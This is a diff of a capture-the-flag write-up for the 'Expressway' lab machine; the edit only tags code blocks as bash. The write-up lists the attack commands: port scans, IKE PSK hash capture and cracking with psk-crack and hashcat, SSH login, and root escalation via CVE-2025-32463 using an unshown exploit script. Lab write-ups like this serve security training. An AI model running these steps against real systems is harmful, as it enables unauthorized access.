@@ -21,7 +21,7 @@ The compromise reflects weaknesses in VPN configuration, cryptographic key manag
 
 I began with a full TCP port scan:
 
-```
+```bash
 sudo nmap 10.129.8.198 -p-
 ```
 
@@ -31,7 +31,7 @@ Only port **22** (SSH) was open.
 
 I followed up with a service and default script scan: 
 
-```
+```bash
 sudo nmap 10.129.8.198 -p 22 -sV -sC
 ```
 
@@ -42,7 +42,7 @@ The host was running **OpenSSH 10.0p2** on Linux.
 
 I run some targeted SSH scripts with NSE:
 
-```
+```bash
 sudo nmap 10.129.8.198 -p 22 --script ssh*
 ```
 
@@ -50,7 +50,7 @@ NSE SSH scripts returned no useful misconfigurations or weaknesses.
 
 Because the TCP footprint was minimal, I proceeded with a full UDP scan:
 
-```
+```bash
 sudo nmap -p- -sU 10.129.8.198 --max-retries 0 --min-rate=3000
 ```
 
@@ -64,7 +64,7 @@ This identified UDP port **500** open, running **ISAKMP**, a key exchange protoc
 
 To enumerate the VPN gateway, I used **ike-scan**, a tool designed for fingerprinting IKE configurations.
 
-```
+```bash
 sudo apt install ike-scan
 sudo ike-scan -A 10.129.8.198
 ```
@@ -83,19 +83,19 @@ The scan revealed some interesting information:
 
 To extract the raw PSK hash for offline cracking:
 
-```
+```bash
 sudo ike-scan -A --pskcrack=ike_hash.txt 10.129.8.198
 ```
 
 First, I ensured the RockYou wordlist was decompressed:
 
-```
+```bash
 gzip -d /usr/share/wordlists/rockyou.txt.gz
 ```
 
 I then attempted cracking using **psk-crack**:
 
-```
+```bash
 psk-crack ike_hash.txt -d /usr/share/wordlists/rockyou.txt
 ```
 
@@ -105,7 +105,7 @@ The PSK was succesfully recovered!
 
 As an alternative, **Hashcat** also supports this hash type (mode 5400):
 
-```
+```bash
 hashcat -a 0 -m 5400 ike_hash.txt /usr/share/wordlists/rockyou.txt
 ```
 
@@ -125,7 +125,7 @@ Recovered Credentials:
 
 With the recovered PSK and IKE identity, I attempted SSH access:
 
-```
+```bash
 ssh ike@expressway.htb
 ```
 
@@ -133,13 +133,13 @@ ssh ike@expressway.htb
 
 The connection initially failed due to missing host resolution. I added the hostname to **/etc/hosts**:
 
-```
+```bash
 echo "10.129.8.198 expressway.htb" | sudo tee -a /etc/hosts
 ```
 
 Retrying the SSH connection:
 
-```
+```bash
 ssh ike@expressway.htb
 ```
 
@@ -149,7 +149,7 @@ I successfully authenticated and obtained a user shell.
 
 The first flag was located in the home directory in a file called **user.txt**:
 
-```
+```bash
 cat ~/user.txt
 ```
 
@@ -167,7 +167,7 @@ User Flag:
 
 I attempted to search for the root flag:
 
-```
+```bash
 sudo find / -type f -name "root.txt"
 ```
 
@@ -177,7 +177,7 @@ However, the user had no sudo privileges.
 
 Checking the sudo version:
 
-```
+```bash
 sudo --version
 ```
 
@@ -187,7 +187,7 @@ The system ran sudo **1.9.17**, which is vulnerable to CVE-2025-32463, a local p
 
 After making it executable:
 
-```
+```bash
 chmod +x exploit.sh
 ./exploit.sh
 ```
@@ -202,7 +202,7 @@ This successfully elevated the session to root.
 
 With root access, I searched again for the root flag:
 
-```
+```bash
 find / -type f -name "root.txt"
 cat /root/root.txt
 ```
